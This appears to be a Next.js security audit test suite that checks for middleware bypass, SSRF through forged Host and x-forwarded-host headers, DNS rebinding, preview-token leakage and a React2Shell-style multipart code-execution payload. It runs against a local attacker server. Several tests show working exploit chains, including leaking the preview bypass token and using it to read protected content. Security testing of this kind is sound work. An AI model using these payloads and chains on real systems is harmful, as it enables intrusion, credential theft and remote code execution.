import fs from 'fs'
import { execFile } from 'node:child_process'
import fsPromises from 'node:fs/promises'
import http from 'http'
import type { AddressInfo } from 'net'
import net from 'net'
import { nextTestSetup } from 'e2e-utils'
import { join } from 'node:path'
import { listClientChunks, retry } from 'next-test-utils'

type CapturedActionRequest = {
  headers: Record<string, string>
  postData: string
}

type CapturedRscRequest = {
  path: string
  headers: Record<string, string>
}

type RevalidateHostHeaderRepro = {
  statusCode: number
  body: string
  captured: {
    method: string
    url: string
    headers: http.IncomingHttpHeaders
  }
}

describe('audit-middleware-bypass', () => {
  const auditSecret = `audit-secret-${Date.now()}`
  const { next, isNextStart } = nextTestSetup({
    files: __dirname,
    env: {
      AUDIT_SECRET: auditSecret,
      NODE_OPTIONS: `--require ${join(__dirname, 'rebind-precheck-patch.cjs')}`,
    },
  })

  let evilServer: http.Server
  let evilOrigin: string
  let evilRequests: string[]
  let evilUpgradeRequests: string[]
  let evilRequestHeaders: http.IncomingHttpHeaders[]

  beforeAll(async () => {
    const evilHostname =
      new URL(next.url).hostname === '127.0.0.1' ? 'localhost' : '127.0.0.1'
    evilRequests = []
    evilUpgradeRequests = []
    evilRequestHeaders = []

    evilServer = http.createServer((req, res) => {
      const requestUrl = new URL(req.url || '/', 'http://n')

      evilRequests.push(requestUrl.pathname)
      evilRequestHeaders.push(req.headers)

      if (requestUrl.pathname === '/rebind-image.png') {
        res.writeHead(200, { 'content-type': 'image/png' })
        res.end(
          Buffer.from(
            'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO9W3KsAAAAASUVORK5CYII=',
            'base64'
          )
        )
        return
      }

      if (requestUrl.pathname !== '/attack') {
        res.writeHead(200, { 'content-type': 'text/plain' })
        res.end('evil server')
        return
      }

      const payload = requestUrl.searchParams.get('payload')
      if (!payload) {
        res.writeHead(500)
        res.end('missing payload')
        return
      }

      const {
        targetUrl,
        actionId,
        contentType,
        body,
        accept,
        nextUrl,
        routerStateTree,
      } = JSON.parse(Buffer.from(payload, 'base64url').toString('utf8')) as {
        targetUrl: string
        actionId: string
        contentType?: string
        body: string
        accept?: string
        nextUrl?: string
        routerStateTree?: string
      }

      const headers: Record<string, string> = {
        'next-action': actionId,
        'x-forwarded-host': `${evilHostname}:${(evilServer.address() as AddressInfo).port}`,
      }

      if (contentType) headers['content-type'] = contentType
      if (accept) headers.accept = accept
      if (nextUrl) headers['next-url'] = nextUrl
      if (routerStateTree) {
        headers['next-router-state-tree'] = routerStateTree
      }

      res.setHeader('content-type', 'text/html; charset=utf-8')
      res.end(`<!doctype html>
<html>
  <body>
    <div id="result">pending</div>
    <script>
      (async function () {
        const resultEl = document.getElementById('result')
        try {
          const response = await fetch(${JSON.stringify(targetUrl)}, {
            method: 'POST',
            credentials: 'include',
            headers: ${JSON.stringify(headers)},
            body: ${JSON.stringify(body)},
          })
          resultEl.textContent = 'status:' + response.status
        } catch (error) {
          resultEl.textContent = 'error:' + error.message
        }
      })()
    </script>
  </body>
</html>`)
    })

    evilServer.on('upgrade', (req, socket) => {
      evilUpgradeRequests.push(req.url || '')
      socket.write(
        'HTTP/1.1 101 Switching Protocols\r\n' +
          'Connection: Upgrade\r\n' +
          'Upgrade: websocket\r\n' +
          '\r\n'
      )
      socket.end()
    })

    await new Promise<void>((resolve) => {
      evilServer.listen(0, '127.0.0.1', () => resolve())
    })

    evilOrigin = `http://${evilHostname}:${(evilServer.address() as AddressInfo).port}`
  })

  afterAll(async () => {
    await new Promise<void>((resolve, reject) => {
      evilServer.close((err) => {
        if (err) {
          reject(err)
        } else {
          resolve()
        }
      })
    })
  })

  it.each([
    {
      name: 'plain protected route',
      path: '/protected',
      headers: undefined,
    },
    {
      name: 'rsc suffix route',
      path: '/protected.rsc',
      headers: undefined,
    },
    {
      name: 'segment prefetch tree route',
      path: '/protected.segments/_tree.segment.rsc',
      headers: undefined,
    },
    {
      name: 'segment prefetch full route',
      path: '/protected.segments/_full.segment.rsc',
      headers: undefined,
    },
    {
      name: 'header-only rsc request',
      path: '/protected',
      headers: { rsc: '1' },
    },
    {
      name: 'header-only segment prefetch request',
      path: '/protected',
      headers: {
        rsc: '1',
        'next-router-prefetch': '1',
        'next-router-segment-prefetch': '/_tree',
      },
    },
  ])(
    'does not bypass middleware through alternate App Router transport: $name',
    async ({ path, headers }) => {
      const res = await next.fetch(path, { headers })
      const text = await res.text()

      expect(res.status).toBe(401)
      expect(text).toContain('blocked by middleware')
      expect(text).not.toContain('TOP SECRET PAYLOAD')
    }
  )

  it('does not expose a server-only env value in the rendered response', async () => {
    const res = await next.fetch('/server-only')
    const text = await res.text()

    expect(res.status).toBe(200)
    expect(text).not.toContain(auditSecret)
    expect(text).toContain('server-only page')
  })

  if (isNextStart) {
    it('does not include a server-only env value in client chunks or sourcemaps', async () => {
      const clientChunks = await listClientChunks(
        join(next.testDir, next.distDir)
      )
      const chunkContents = await Promise.all(
        clientChunks
          .filter((file) => file.endsWith('.js') || file.endsWith('.js.map'))
          .map((file) =>
            fsPromises.readFile(join(next.testDir, next.distDir, file), 'utf8')
          )
      )

      expect(chunkContents.length).toBeGreaterThan(0)
      for (const content of chunkContents) {
        expect(content).not.toContain(auditSecret)
      }
    })

    it('does not expose the preview bypass token in public client assets or HTML', async () => {
      const prerenderManifest = await next.readJSON(
        '.next/prerender-manifest.json'
      )
      const previewModeId = prerenderManifest.preview.previewModeId as string

      const clientChunks = await listClientChunks(
        join(next.testDir, next.distDir)
      )
      const chunkContents = await Promise.all(
        clientChunks
          .filter((file) => file.endsWith('.js') || file.endsWith('.js.map'))
          .map((file) =>
            fsPromises.readFile(join(next.testDir, next.distDir, file), 'utf8')
          )
      )

      for (const content of chunkContents) {
        expect(content).not.toContain(previewModeId)
      }

      const homeHtml = await (await next.fetch('/')).text()
      const draftHtml = await (await next.fetch('/draft-only')).text()

      expect(homeHtml).not.toContain(previewModeId)
      expect(draftHtml).not.toContain(previewModeId)
    })

    it('does not proxy absolute-form websocket upgrade requests to attacker targets', async () => {
      evilUpgradeRequests.length = 0

      const nextUrl = new URL(next.url)
      const evilPort = (evilServer.address() as AddressInfo).port

      await new Promise<void>((resolve, reject) => {
        const socket = net.createConnection(
          {
            host: nextUrl.hostname,
            port: Number(nextUrl.port),
          },
          () => {
            socket.write(
              [
                `GET http://127.0.0.1:${evilPort}/ws-attack HTTP/1.1`,
                'Host: victim.example',
                'Connection: Upgrade',
                'Upgrade: websocket',
                'Sec-WebSocket-Version: 13',
                'Sec-WebSocket-Key: dGVzdC10ZXN0LXRlc3Q=',
                '',
                '',
              ].join('\r\n')
            )
          }
        )

        socket.once('error', reject)
        socket.once('close', () => resolve())
      })

      expect(evilUpgradeRequests).not.toContain('/ws-attack')
    })

    it('does not proxy absolute-form HTTP requests to attacker targets', async () => {
      evilRequests.length = 0

      const nextUrl = new URL(next.url)
      const evilPort = (evilServer.address() as AddressInfo).port

      const rawResponse = await new Promise<string>((resolve, reject) => {
        let response = ''
        const socket = net.createConnection(
          {
            host: nextUrl.hostname,
            port: Number(nextUrl.port),
          },
          () => {
            socket.write(
              [
                `GET http://127.0.0.1:${evilPort}/absolute-http-attack HTTP/1.1`,
                'Host: victim.example',
                'Connection: close',
                '',
                '',
              ].join('\r\n')
            )
          }
        )

        socket.setEncoding('utf8')
        socket.on('data', (chunk) => {
          response += chunk
        })
        socket.once('error', reject)
        socket.once('close', () => resolve(response))
      })

      expect(evilRequests).not.toContain('/absolute-http-attack')
      expect(rawResponse.startsWith('HTTP/1.1 ')).toBe(true)
    })

    it('does not reuse cached RSC payloads across next-url interception variants', async () => {
      const interceptedRequest = await captureRscRequest({
        startPath: '/interception/feed',
        clickTarget: 'intercepted-photo-link',
        expectedElementId: 'intercepted-photo-page',
      })
      const normalRequest = await captureRscRequest({
        startPath: '/',
        clickTarget: 'direct-photo-link',
        expectedElementId: 'normal-photo-page',
      })

      const interceptedRes = await next.fetch(interceptedRequest.path, {
        headers: getRscReplayHeaders(interceptedRequest.headers),
      })
      const interceptedBody = await interceptedRes.text()

      expect(interceptedRes.status).toBe(200)
      expect(interceptedBody).toContain('Intercepted photo page')

      const normalRes = await next.fetch(normalRequest.path, {
        headers: getRscReplayHeaders(normalRequest.headers),
      })
      const normalBody = await normalRes.text()

      expect(normalRes.status).toBe(200)
      expect(normalBody).toContain('Photo page (normal, not intercepted)')
      expect(normalBody).not.toContain('Intercepted photo page')
    })
  }

  it('does not allow nxtP query injection to alter a dynamic route param', async () => {
    const res = await next.fetch('/dynamic/public?nxtPslug=admin')
    const text = await res.text()

    expect(res.status).toBe(200)
    expect(text).toContain('dynamic public payload:')
    expect(text).toContain('public')
    expect(text).not.toContain('DYNAMIC TOP SECRET PAYLOAD')
  })

  it('still blocks the real protected dynamic pathname', async () => {
    const res = await next.fetch('/dynamic/admin')
    const text = await res.text()

    expect(res.status).toBe(401)
    expect(text).toContain('blocked dynamic admin')
    expect(text).not.toContain('DYNAMIC TOP SECRET PAYLOAD')
  })

  it('fetches a loopback image when the precheck DNS answer is rebound before fetch', async () => {
    evilRequests.length = 0
    const evilPort = (evilServer.address() as AddressInfo).port

    const res = await next.fetch(
      `/_next/image?url=${encodeURIComponent(`http://localhost:${evilPort}/rebind-image.png`)}&w=64&q=75`,
      {
        headers: {
          accept: 'image/png',
        },
      }
    )
    const body = Buffer.from(await res.arrayBuffer())

    expect(res.status).toBe(200)
    expect(res.headers.get('content-type')).toMatch(/^image\//)
    expect(body.byteLength).toBeGreaterThan(0)
    expect(evilRequests).toContain('/rebind-image.png')
  })

  it('forwards revalidation requests to the untrusted Host header in trustHostHeader fallback mode', async () => {
    const repro = await runRevalidateHostHeaderRepro('preview-token')

    expect(repro.statusCode).toBe(200)
    expect(repro.captured.method).toBe('HEAD')
    expect(repro.captured.url).toBe('/')
    expect(repro.captured.headers['x-prerender-revalidate']).toBe(
      'preview-token'
    )
    expect(repro.captured.headers.cookie).toBe('session=stealme')
  })

  if (isNextStart) {
    it('leaks a draft-mode bypass token through the revalidate host-header sink', async () => {
      const withoutCookie = await next.fetch('/draft-only')
      const withoutCookieText = await withoutCookie.text()

      expect(withoutCookie.status).toBe(200)
      expect(withoutCookieText).toContain('draft mode disabled')
      expect(withoutCookieText).not.toContain('DRAFT SECRET PAYLOAD')

      const prerenderManifest = await next.readJSON(
        '.next/prerender-manifest.json'
      )
      const previewModeId = prerenderManifest.preview.previewModeId as string

      const repro = await runRevalidateHostHeaderRepro(previewModeId)
      const leakedToken = repro.captured.headers['x-prerender-revalidate']

      expect(leakedToken).toBe(previewModeId)

      const withCookie = await next.fetch('/draft-only', {
        headers: {
          cookie: `__prerender_bypass=${leakedToken}`,
        },
      })
      const withCookieText = await withCookie.text()

      expect(withCookie.status).toBe(200)
      expect(withCookieText).toContain('DRAFT SECRET PAYLOAD')
    })

    it('uses the leaked preview token to bypass proxy-only auth on a protected route', async () => {
      const blockedRes = await next.fetch('/protected')
      const blockedText = await blockedRes.text()

      expect(blockedRes.status).toBe(401)
      expect(blockedText).toContain('blocked by middleware')

      const prerenderManifest = await next.readJSON(
        '.next/prerender-manifest.json'
      )
      const previewModeId = prerenderManifest.preview.previewModeId as string

      const repro = await runRevalidateHostHeaderRepro(previewModeId)
      const leakedToken = repro.captured.headers['x-prerender-revalidate']

      expect(leakedToken).toBe(previewModeId)

      const bypassRes = await next.fetch('/protected', {
        headers: {
          'x-prerender-revalidate': leakedToken as string,
        },
      })
      const bypassText = await bypassRes.text()

      expect(bypassRes.status).toBe(200)
      expect(bypassText).toContain('TOP SECRET PAYLOAD')
    })
  }

  async function captureActionRequest(
    buttonId:
      | 'trigger-action'
      | 'trigger-redirect-action'
      | 'trigger-revalidating-redirect-action'
      | 'trigger-secondary-action' = 'trigger-action',
    startPath = '/'
  ): Promise<CapturedActionRequest> {
    let capturedActionRequest: CapturedActionRequest | undefined
    const expectedPathname = new URL(startPath, next.url).pathname

    const browser = await next.browser(startPath, {
      beforePageLoad(page) {
        page.on('request', (request) => {
          const headers = request.headers()

          if (
            request.method() === 'POST' &&
            headers['next-action'] &&
            new URL(request.url()).pathname === expectedPathname
          ) {
            capturedActionRequest = {
              headers,
              postData: request.postData() ?? '',
            }
          }
        })
      },
    })

    await browser.eval(`fetch('/api/set-auth', { credentials: 'include' })`)

    await retry(async () => {
      expect(await browser.eval('document.cookie')).toContain('auth=1')
    })

    await browser.elementById(buttonId).click()

    await retry(async () => {
      expect(capturedActionRequest).toBeDefined()
      if (buttonId === 'trigger-action') {
        expect(await browser.eval('document.cookie')).toContain(
          'action-fired=1'
        )
      }
    })

    if (!capturedActionRequest) {
      throw new Error('Expected to capture a valid server action request')
    }

    return capturedActionRequest
  }

  function getRscReplayHeaders(headers: Record<string, string>) {
    const replayHeaders: Record<string, string> = {}

    for (const key of [
      'accept',
      'rsc',
      'next-router-state-tree',
      'next-router-prefetch',
      'next-router-segment-prefetch',
      'next-url',
    ]) {
      if (headers[key]) {
        replayHeaders[key] = headers[key]
      }
    }

    return replayHeaders
  }

  async function captureRscRequest({
    startPath,
    clickTarget,
    expectedElementId,
  }: {
    startPath: string
    clickTarget: string
    expectedElementId: string
  }): Promise<CapturedRscRequest> {
    let captured: CapturedRscRequest | undefined

    const browser = await next.browser(startPath, {
      beforePageLoad(page) {
        page.on('request', (request) => {
          const url = new URL(request.url())
          if (!url.searchParams.has('_rsc')) return
          if (url.pathname !== '/interception/photo') return

          captured = {
            path: `${url.pathname}${url.search}`,
            headers: request.headers() as Record<string, string>,
          }
        })
      },
    })

    await browser.elementById(clickTarget).click()
    await browser.waitForElementByCss(`#${expectedElementId}`)

    await retry(async () => {
      expect(captured).toBeDefined()
    })

    return captured!
  }

  async function runRevalidateHostHeaderRepro(
    previewModeId = 'preview-token'
  ): Promise<RevalidateHostHeaderRepro> {
    return await new Promise<RevalidateHostHeaderRepro>((resolve, reject) => {
      execFile(
        'node',
        [join(__dirname, 'revalidate-host-header-ssrf-repro.js')],
        {
          cwd: process.cwd(),
          env: {
            ...process.env,
            AUDIT_PREVIEW_MODE_ID: previewModeId,
            NODE_TLS_REJECT_UNAUTHORIZED: '0',
          },
        },
        (error, stdout, stderr) => {
          if (error) {
            reject(new Error(stderr || error.message))
            return
          }

          resolve(JSON.parse(stdout))
        }
      )
    })
  }

  async function issueRequestWithHostHeader({
    hostHeader,
    forwardedHostHeader,
    originHostHeader,
    actionRequest,
  }: {
    hostHeader: string
    forwardedHostHeader?: string
    originHostHeader?: string
    actionRequest: CapturedActionRequest
  }) {
    const nextUrl = new URL(next.url)

    return await new Promise<{
      statusCode: number
      body: string
      headers: http.IncomingHttpHeaders
    }>((resolve, reject) => {
      const req = http.request(
        {
          hostname: nextUrl.hostname,
          port: nextUrl.port,
          path: '/',
          method: 'POST',
          headers: {
            host: hostHeader,
            origin: `http://${originHostHeader || hostHeader}`,
            cookie: 'auth=1',
            'next-action': actionRequest.headers['next-action'],
            'content-type': actionRequest.headers['content-type'],
            accept: actionRequest.headers.accept,
            ...(forwardedHostHeader
              ? { 'x-forwarded-host': forwardedHostHeader }
              : {}),
            ...(actionRequest.headers['next-url']
              ? { 'next-url': actionRequest.headers['next-url'] }
              : {}),
            ...(actionRequest.headers['next-router-state-tree']
              ? {
                  'next-router-state-tree':
                    actionRequest.headers['next-router-state-tree'],
                }
              : {}),
          },
        },
        (res) => {
          const chunks: Buffer[] = []
          res.on('data', (chunk) => chunks.push(Buffer.from(chunk)))
          res.on('end', () => {
            resolve({
              statusCode: res.statusCode || 0,
              body: Buffer.concat(chunks).toString('utf8'),
              headers: res.headers,
            })
          })
        }
      )

      req.on('error', reject)
      req.write(actionRequest.postData)
      req.end()
    })
  }

  it('accepts a forged x-forwarded-host on a raw server action request', async () => {
    const capturedActionRequest = await captureActionRequest()
    const evilHost = new URL(evilOrigin).host

    const res = await next.fetch('/', {
      method: 'POST',
      headers: {
        'next-action': capturedActionRequest.headers['next-action'],
        'content-type': capturedActionRequest.headers['content-type'],
        accept: capturedActionRequest.headers.accept,
        ...(capturedActionRequest.headers['next-url']
          ? { 'next-url': capturedActionRequest.headers['next-url'] }
          : {}),
        ...(capturedActionRequest.headers['next-router-state-tree']
          ? {
              'next-router-state-tree':
                capturedActionRequest.headers['next-router-state-tree'],
            }
          : {}),
        origin: evilOrigin,
        'x-forwarded-host': evilHost,
        cookie: 'auth=1',
      },
      body: capturedActionRequest.postData,
    })

    expect(res.status).toBe(200)
    expect(res.headers.get('set-cookie')).toContain('action-fired=1')
  })

  it('still fails from a browser-controlled cross-origin page because preflight blocks the custom header', async () => {
    const capturedActionRequest = await captureActionRequest()
    const browser = await next.browser('/')

    await browser.eval(`fetch('/api/set-auth', { credentials: 'include' })`)
    await retry(async () => {
      expect(await browser.eval('document.cookie')).toContain('auth=1')
    })

    const payload = JSON.stringify({
      targetUrl: `${next.url}/`,
      actionId: capturedActionRequest.headers['next-action'],
      contentType: capturedActionRequest.headers['content-type'],
      body: capturedActionRequest.postData,
      accept: capturedActionRequest.headers.accept,
      nextUrl: capturedActionRequest.headers['next-url'],
      routerStateTree: capturedActionRequest.headers['next-router-state-tree'],
    })

    await browser.loadPage(
      `${evilOrigin}/attack?payload=${Buffer.from(payload).toString('base64url')}`
    )

    await retry(async () => {
      expect(await browser.elementById('result').text()).toMatch(/^error:/)
    })

    await browser.loadPage(`${next.url}/`)

    expect(await browser.eval('document.cookie')).toContain('auth=1')
    expect(await browser.eval('document.cookie')).not.toContain(
      'action-fired=1'
    )
  })

  it('does not disclose server action source code to a malformed RSC request', async () => {
    const capturedActionRequest = await captureActionRequest()
    const actionId = capturedActionRequest.headers['next-action']
    const boundary = '----SourceLeak'
    const body = [
      `--${boundary}`,
      'Content-Disposition: form-data; name="0"',
      '',
      '["$F1"]',
      `--${boundary}`,
      'Content-Disposition: form-data; name="1"',
      '',
      JSON.stringify({ id: actionId, bound: null }),
      `--${boundary}--`,
      '',
    ].join('\r\n')

    const res = await next.fetch('/', {
      method: 'POST',
      headers: {
        accept: 'text/x-component',
        'content-type': `multipart/form-data; boundary=${boundary}`,
        'next-action': actionId,
      },
      body,
    })

    const text = await res.text()

    expect(text).not.toContain('cookieStore.set')
    expect(text).not.toContain('unauthorized')
    expect(text).not.toContain('action-fired')
  })

  it('does not execute a React2Shell-style multipart payload before action validation', async () => {
    const markerPath = '/tmp/next-audit-react2shell-hit'
    const boundary = '----React2ShellAudit'
    const payload = JSON.stringify({
      then: '$1:__proto__:then',
      status: 'resolved_model',
      reason: -1,
      value: '{"then":"$B0"}',
      _response: {
        _prefix: `process.getBuiltinModule('node:fs').writeFileSync(${JSON.stringify(markerPath)},'hit');return '';//`,
        _formData: {
          get: '$1:constructor:constructor',
        },
      },
    })
    const body = [
      `--${boundary}`,
      'Content-Disposition: form-data; name="0"',
      '',
      payload,
      `--${boundary}`,
      'Content-Disposition: form-data; name="1"',
      '',
      '"$@0"',
      `--${boundary}--`,
      '',
    ].join('\r\n')

    await fs.promises.rm(markerPath, { force: true })

    await next.fetch('/', {
      method: 'POST',
      headers: {
        accept: 'text/x-component',
        'content-type': `multipart/form-data; boundary=${boundary}`,
        'next-action': '123',
      },
      body,
    })

    expect(fs.existsSync(markerPath)).toBe(false)
  })

  it('does not issue server-side redirect fetches to a spoofed Host header', async () => {
    const redirectActionRequest = await captureActionRequest(
      'trigger-redirect-action'
    )
    const evilHost = new URL(evilOrigin).host

    evilRequests.length = 0

    const res = await issueRequestWithHostHeader({
      hostHeader: evilHost,
      actionRequest: redirectActionRequest,
    })

    expect(res.statusCode).toBeGreaterThanOrEqual(300)
    expect(evilRequests).not.toContain('/post-action-landing')
  })

  it('fetches a forged x-forwarded-host during redirect follow-up if private origin is absent', async () => {
    const redirectActionRequest = await captureActionRequest(
      'trigger-redirect-action'
    )
    const nextHost = new URL(next.url).host
    const evilHost = new URL(evilOrigin).host

    await next.fetch('/api/clear-private-origin')

    evilRequests.length = 0
    evilRequestHeaders.length = 0

    const res = await issueRequestWithHostHeader({
      hostHeader: nextHost,
      forwardedHostHeader: evilHost,
      originHostHeader: evilHost,
      actionRequest: redirectActionRequest,
    })

    expect(res.statusCode).toBeGreaterThanOrEqual(300)
    expect(evilRequests).toContain('/post-action-landing')
    expect(
      evilRequestHeaders.some((headers) => headers.cookie?.includes('auth=1'))
    ).toBe(true)
  })

  if (isNextStart) {
    it('leaks the preview token from a revalidating redirect action to the forged host', async () => {
      const redirectActionRequest = await captureActionRequest(
        'trigger-revalidating-redirect-action'
      )
      const nextHost = new URL(next.url).host
      const evilHost = new URL(evilOrigin).host
      const prerenderManifest = await next.readJSON(
        '.next/prerender-manifest.json'
      )
      const previewModeId = prerenderManifest.preview.previewModeId as string

      await next.fetch('/api/clear-private-origin')

      evilRequests.length = 0
      evilRequestHeaders.length = 0

      const res = await issueRequestWithHostHeader({
        hostHeader: nextHost,
        forwardedHostHeader: evilHost,
        originHostHeader: evilHost,
        actionRequest: redirectActionRequest,
      })

      expect(res.statusCode).toBeGreaterThanOrEqual(300)
      expect(evilRequests).toContain('/post-action-landing')
      expect(
        evilRequestHeaders.some(
          (headers) =>
            headers['x-next-revalidate-tag-token'] === previewModeId &&
            headers['x-next-revalidated-tags']?.includes('/protected')
        )
      ).toBe(true)

      const bypassRes = await next.fetch('/protected', {
        headers: {
          'x-prerender-revalidate': previewModeId,
        },
      })
      const bypassText = await bypassRes.text()

      expect(bypassRes.status).toBe(200)
      expect(bypassText).toContain('TOP SECRET PAYLOAD')
    })

    it('forwards cross-worker Server Action requests to the forged host if private origin is absent', async () => {
      const secondaryActionRequest = await captureActionRequest(
        'trigger-secondary-action',
        '/secondary'
      )
      const nextHost = new URL(next.url).host
      const evilHost = new URL(evilOrigin).host

      await next.fetch('/api/clear-private-origin')

      evilRequests.length = 0
      evilRequestHeaders.length = 0

      const res = await issueRequestWithHostHeader({
        hostHeader: nextHost,
        forwardedHostHeader: evilHost,
        originHostHeader: evilHost,
        actionRequest: secondaryActionRequest,
      })

      expect(res.statusCode).toBe(200)
      expect(evilRequests).toContain('/secondary')
      expect(
        evilRequestHeaders.some(
          (headers) =>
            headers.cookie?.includes('auth=1') &&
            headers['next-action'] ===
              secondaryActionRequest.headers['next-action']
        )
      ).toBe(true)
    })
  }
})
